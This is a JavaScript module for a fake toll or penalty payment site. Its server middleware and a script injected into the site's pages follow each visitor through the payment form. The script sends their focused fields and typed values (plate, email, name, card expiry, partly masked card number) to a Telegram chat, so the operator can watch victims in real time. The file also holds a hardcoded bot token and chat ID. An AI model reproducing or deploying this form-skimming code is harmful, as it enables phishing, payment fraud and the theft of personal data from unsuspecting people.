/**
 * Telegram Logger - серверное + клиентское отслеживание действий пользователей
 * Одна сессия = одно редактируемое сообщение
 */

const https = require('https');
const logger = require('./logger');

// Telegram Bot Configuration
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8442088504:AAFbgTfMYJKK61LnV2jLJPMgG9kf7eNKeuk';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1003580814172';

// Store session data: sessionId -> { messageId, logs: [], ip, userAgent, startTime }
const sessions = new Map();

// Clean old sessions after 30 minutes
const SESSION_TIMEOUT = 30 * 60 * 1000;

setInterval(() => {
  const now = Date.now();
  for (const [sessionId, session] of sessions) {
    if (now - session.startTime > SESSION_TIMEOUT) {
      sessions.delete(sessionId);
    }
  }
}, 60 * 1000);

/**
 * Send message to Telegram
 */
async function sendTelegramMessage(text, parseMode = 'HTML') {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
      parse_mode: parseMode,
      disable_web_page_preview: true,
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
      },
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        try {
          const result = JSON.parse(body);
          if (result.ok) {
            resolve(result.result);
          } else {
            logger.error('[TG] Send error:', result.description);
            reject(new Error(result.description));
          }
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', (err) => {
      logger.error('[TG] Request error:', err.message);
      reject(err);
    });
    req.write(data);
    req.end();
  });
}

/**
 * Edit existing message in Telegram
 */
async function editTelegramMessage(messageId, text, parseMode = 'HTML') {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      chat_id: CHAT_ID,
      message_id: messageId,
      text: text,
      parse_mode: parseMode,
      disable_web_page_preview: true,
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${BOT_TOKEN}/editMessageText`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
      },
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        try {
          const result = JSON.parse(body);
          if (result.ok) {
            resolve(result.result);
          } else {
            if (result.description && result.description.includes('message is not modified')) {
              resolve(null);
            } else {
              reject(new Error(result.description));
            }
          }
        } catch (e) {
          reject(e);
        }
      });
    });

    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

/**
 * Get page name in Russian
 */
function getPageNameRu(path) {
  if (!path || path === '/' || path === '') return 'Главная';
  
  const cleanPath = path.split('?')[0].replace(/^\//, '').replace(/\/$/, '');
  
  const translations = {
    'pay-toll': 'Страница оплаты штрафа',
    'pay-penalty': 'Страница оплаты штрафа',
    'user/login': 'Вход в аккаунт',
    'user/register': 'Регистрация',
    'login': 'Вход',
    'register': 'Регистрация',
    'account': 'Личный кабинет',
    'contact': 'Контакты',
    'about': 'О нас',
    'help': 'Помощь',
    'faq': 'FAQ',
    'appeal': 'Апелляция',
  };
  
  if (translations[cleanPath]) {
    return translations[cleanPath];
  }
  
  for (const [key, value] of Object.entries(translations)) {
    if (cleanPath.includes(key)) {
      return value;
    }
  }
  
  return cleanPath.charAt(0).toUpperCase() + cleanPath.slice(1);
}

/**
 * Generate session ID from request
 */
function getSessionId(req) {
  const cookies = req.headers.cookie || '';
  const sessionMatch = cookies.match(/SESS[a-f0-9]+=[a-zA-Z0-9%_-]+/);
  
  if (sessionMatch) {
    return 'drupal_' + sessionMatch[0].substring(0, 20);
  }
  
  const ip = req.ip || req.socket?.remoteAddress || 'unknown';
  const ua = (req.headers['user-agent'] || 'unknown').substring(0, 50);
  const hash = Buffer.from(ip + ua).toString('base64').substring(0, 12);
  return 'ip_' + hash;
}

/**
 * Format session message for Telegram
 */
function formatSessionMessage(session, sessionId) {
  const shortId = sessionId.substring(0, 15).toUpperCase();
  
  let message = `🔗 <b>Client</b> [<code>${shortId}</code>]\n`;
  message += `📱 <code>${(session.userAgent || 'Unknown').substring(0, 80)}</code>\n`;
  message += `🌍 IP: <code>${session.ip || 'Unknown'}</code>\n\n`;
  
  // Add logs
  session.logs.forEach((log) => {
    const time = new Date(log.time).toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    
    switch (log.type) {
      case 'page_view':
        message += `📍 [${time}] Находится на: <b>${log.page}</b>\n`;
        break;
      case 'navigation':
        message += `↪️ [${time}] Перешёл на: <b>${log.page}</b>\n`;
        break;
      case 'form_submit':
        message += `📤 [${time}] Отправил форму на: <b>${log.page}</b>\n`;
        break;
      case 'payment_page':
        message += `💳 [${time}] Открыл страницу оплаты\n`;
        break;
      case 'login_page':
        message += `🔐 [${time}] Страница входа\n`;
        break;
      // NEW: Детальное отслеживание этапов оплаты
      case 'form_step_1':
        message += `📝 [${time}] <b>Шаг 1:</b> Вводит номер авто\n`;
        break;
      case 'form_step_2':
        message += `📝 [${time}] <b>Шаг 2:</b> Вводит email\n`;
        break;
      case 'form_step_3':
        message += `📝 [${time}] <b>Шаг 3:</b> Подтверждение данных\n`;
        break;
      case 'form_input':
        message += `✏️ [${time}] Заполняет: <b>${log.field || 'поле'}</b>\n`;
        break;
      case 'form_filled':
        message += `✅ [${time}] Заполнил: <b>${log.field || 'поле'}</b> = <code>${log.value || ''}</code>\n`;
        break;
      case 'card_page':
        message += `💳 [${time}] <b>СТРАНИЦА ВВОДА КАРТЫ!</b>\n`;
        break;
      case 'payment_redirect':
        message += `💰 [${time}] <b>ПЕРЕХОД НА ОПЛАТУ!</b> Сумма: €${log.amount || '?'}\n`;
        break;
      case 'page_leave_external':
        message += `🚪 [${time}] <b>Покинул сайт</b>\n`;
        break;
      default:
        message += `• [${time}] ${log.message || log.type}\n`;
    }
  });
  
  return message;
}

/**
 * Track event from client or server
 */
async function trackEvent(sessionId, eventData, meta = {}) {
  try {
    let session = sessions.get(sessionId);
    
    if (!session) {
      session = {
        messageId: null,
        logs: [],
        ip: meta.ip || 'Unknown',
        userAgent: meta.userAgent || 'Unknown',
        startTime: Date.now(),
        lastPage: null,
      };
      sessions.set(sessionId, session);
    }
    
    // Update meta if provided
    if (meta.ip) session.ip = meta.ip;
    if (meta.userAgent) session.userAgent = meta.userAgent;
    
    // Add log entry
    const logEntry = {
      type: eventData.type || 'unknown',
      page: eventData.page || '',
      field: eventData.field || '',
      value: eventData.value || '',
      amount: eventData.amount || '',
      url: eventData.url || '',
      message: eventData.message || '',
      time: Date.now(),
    };
    
    // Avoid duplicates within 3 seconds
    const lastLog = session.logs[session.logs.length - 1];
    const isDuplicate = lastLog && 
      lastLog.type === logEntry.type && 
      lastLog.page === logEntry.page &&
      lastLog.field === logEntry.field &&
      (Date.now() - lastLog.time) < 3000;
    
    if (!isDuplicate) {
      session.logs.push(logEntry);
      
      if (session.logs.length > 20) {
        session.logs = session.logs.slice(-20);
      }
      
      // Format and send/edit message
      const messageText = formatSessionMessage(session, sessionId);
      
      if (session.messageId) {
        await editTelegramMessage(session.messageId, messageText);
      } else {
        const result = await sendTelegramMessage(messageText);
        if (result && result.message_id) {
          session.messageId = result.message_id;
          logger.info(`[TG] New session ${sessionId}, message_id: ${result.message_id}`);
        }
      }
    }
    
  } catch (error) {
    logger.error('[TG] Track error:', error.message);
  }
}

/**
 * Track page request (called from server middleware)
 */
async function trackPageRequest(req) {
  try {
    const path = req.url || req.path || '/';
    
    // Skip static files
    if (path.match(/\.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot|map)(\?|$)/i)) {
      return;
    }
    
    if (path.startsWith('/api/') || path.startsWith('/_') || path === '/__track') {
      return;
    }
    
    const sessionId = getSessionId(req);
    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const method = req.method || 'GET';
    const pageName = getPageNameRu(path);
    
    let session = sessions.get(sessionId);
    
    // Determine action type
    let actionType = 'page_view';
    
    if (session && session.lastPage && session.lastPage !== path) {
      actionType = 'navigation';
    }
    
    if (method === 'POST') {
      actionType = 'form_submit';
    }
    
    if (path.includes('pay-toll') || path.includes('pay-penalty') || path.includes('payment')) {
      actionType = 'payment_page';
    }
    
    if (path.includes('login') || path.includes('user/login')) {
      actionType = 'login_page';
    }
    
    await trackEvent(sessionId, {
      type: actionType,
      page: pageName,
      path: path,
    }, { ip, userAgent });
    
    // Update last page
    if (sessions.has(sessionId)) {
      sessions.get(sessionId).lastPage = path;
    }
    
  } catch (error) {
    logger.error('[TG] Track request error:', error.message);
  }
}

/**
 * Express middleware for tracking
 */
function trackingMiddleware(req, res, next) {
  trackPageRequest(req).catch(() => {});
  next();
}

/**
 * API endpoint handler for client-side tracking
 */
async function handleTrackingAPI(req, res) {
  try {
    const sessionId = getSessionId(req);
    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        const data = JSON.parse(body);
        await trackEvent(sessionId, data, { ip, userAgent });
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true }));
      } catch (e) {
        res.writeHead(400);
        res.end('Bad Request');
      }
    });
  } catch (error) {
    res.writeHead(500);
    res.end('Error');
  }
}

/**
 * Client-side tracking script
 */
function getTrackingScript() {
  return `
<script>
(function() {
  var tracked = {};
  var lastStep = 0;
  
  function sendTrack(data) {
    var key = data.type + '_' + (data.field || '') + '_' + (data.page || '');
    if (tracked[key] && Date.now() - tracked[key] < 3000) return;
    tracked[key] = Date.now();
    
    try {
      navigator.sendBeacon('/__track', JSON.stringify(data));
    } catch(e) {
      fetch('/__track', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: { 'Content-Type': 'application/json' }
      }).catch(function(){});
    }
  }
  
  // Detect form steps on pay-toll page
  function detectFormStep() {
    var path = location.pathname;
    if (!path.includes('pay-toll') && !path.includes('payment')) return;
    
    // Look for step indicators
    var stepIndicator = document.querySelector('.step-indicator, .progress-step, .wizard-step, [class*="step"]');
    var activeStep = document.querySelector('.step.active, .step-active, [class*="step"][class*="active"]');
    
    // Look for specific form fields
    var regInput = document.querySelector('input[name*="reg"], input[name*="vehicle"], input[name*="plate"], input[placeholder*="reg"], input[placeholder*="номер"]');
    var emailInput = document.querySelector('input[type="email"], input[name*="email"]');
    var cardInput = document.querySelector('input[name*="card"], input[name*="pan"], input[placeholder*="card"]');
    var confirmBtn = document.querySelector('button[type="submit"], input[type="submit"], .confirm-btn, .pay-btn');
    
    var currentStep = 0;
    
    // Determine step by visible fields
    if (cardInput && isVisible(cardInput)) {
      currentStep = 4; // Card input
      if (lastStep !== 4) {
        sendTrack({ type: 'card_page', page: 'Ввод данных карты' });
      }
    } else if (confirmBtn && document.querySelector('.summary, .review, .confirm')) {
      currentStep = 3; // Confirmation
      if (lastStep !== 3) {
        sendTrack({ type: 'form_step_3', page: 'Подтверждение' });
      }
    } else if (emailInput && isVisible(emailInput)) {
      currentStep = 2; // Email step
      if (lastStep !== 2) {
        sendTrack({ type: 'form_step_2', page: 'Ввод email' });
      }
    } else if (regInput && isVisible(regInput)) {
      currentStep = 1; // Registration number
      if (lastStep !== 1) {
        sendTrack({ type: 'form_step_1', page: 'Ввод номера авто' });
      }
    }
    
    lastStep = currentStep;
  }
  
  function isVisible(el) {
    if (!el) return false;
    var style = window.getComputedStyle(el);
    return style.display !== 'none' && style.visibility !== 'hidden' && el.offsetParent !== null;
  }
  
  // Track form inputs
  document.addEventListener('focus', function(e) {
    var el = e.target;
    if (el.tagName === 'INPUT' || el.tagName === 'SELECT' || el.tagName === 'TEXTAREA') {
      var fieldName = el.name || el.placeholder || el.id || el.type || 'поле';
      // Translate common field names
      if (fieldName.match(/email/i)) fieldName = 'Email';
      else if (fieldName.match(/reg|plate|vehicle/i)) fieldName = 'Номер авто';
      else if (fieldName.match(/card|pan/i)) fieldName = 'Номер карты';
      else if (fieldName.match(/cvv|cvc/i)) fieldName = 'CVV';
      else if (fieldName.match(/expir|exp/i)) fieldName = 'Срок действия';
      else if (fieldName.match(/name|holder/i)) fieldName = 'Имя владельца';
      else if (fieldName.match(/phone|tel/i)) fieldName = 'Телефон';
      
      sendTrack({ type: 'form_input', field: fieldName });
    }
  }, true);
  
  // Track form blur (filled)
  document.addEventListener('blur', function(e) {
    var el = e.target;
    if ((el.tagName === 'INPUT' || el.tagName === 'SELECT') && el.value) {
      var fieldName = el.name || el.placeholder || el.id || 'поле';
      var value = el.value;
      
      // Translate and mask
      if (fieldName.match(/email/i)) {
        fieldName = 'Email';
        value = value.replace(/(.{2}).*@/, '$1***@');
      } else if (fieldName.match(/reg|plate|vehicle/i)) {
        fieldName = 'Номер авто';
      } else if (fieldName.match(/card|pan/i)) {
        fieldName = 'Номер карты';
        value = value.replace(/\d(?=\d{4})/g, '*');
      } else if (fieldName.match(/cvv|cvc/i)) {
        fieldName = 'CVV';
        value = '***';
      } else if (fieldName.match(/expir|exp/i)) {
        fieldName = 'Срок действия';
      } else if (fieldName.match(/name|holder/i)) {
        fieldName = 'Имя владельца';
      }
      
      if (value.length > 30) value = value.substring(0, 30) + '...';
      
      sendTrack({ type: 'form_filled', field: fieldName, value: value });
    }
  }, true);
  
  // Track only real page leave (to external site)
  // Don't track beforeunload as it fires for internal navigation too
  
  // Track external link clicks only
  document.addEventListener('click', function(e) {
    var link = e.target.closest('a');
    if (link && link.href) {
      try {
        var url = new URL(link.href, location.href);
        // Only track if leaving to external domain
        if (url.hostname && url.hostname !== location.hostname && !url.hostname.includes('efflow')) {
          sendTrack({ type: 'page_leave_external', page: 'Переход на ' + url.hostname });
        }
      } catch(e) {}
    }
  }, true);
  
  // Run detection periodically
  setInterval(function() {
    detectFormStep();
  }, 2000);
  
  // Initial detection
  setTimeout(detectFormStep, 500);
})();
</script>`;
}

module.exports = {
  trackPageRequest,
  trackingMiddleware,
  handleTrackingAPI,
  trackEvent,
  sendTelegramMessage,
  editTelegramMessage,
  getTrackingScript,
  getSessionId,
};
